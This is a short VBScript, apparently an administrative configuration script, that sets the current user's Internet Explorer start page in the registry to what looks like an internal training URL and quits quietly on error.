Option Explicit
Dim wshShell, url, regKey
On Error Resume Next
  Set wshShell = CreateObject("WScript.Shell")
  url = "http://trn08.ebs4.agentweb"
  regKey = "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"
  wshShell.RegWrite regKey, url, "REG_SZ"
  If Err.Number <> 0 Then
   WScript.Quit
  End If
On Error Goto 0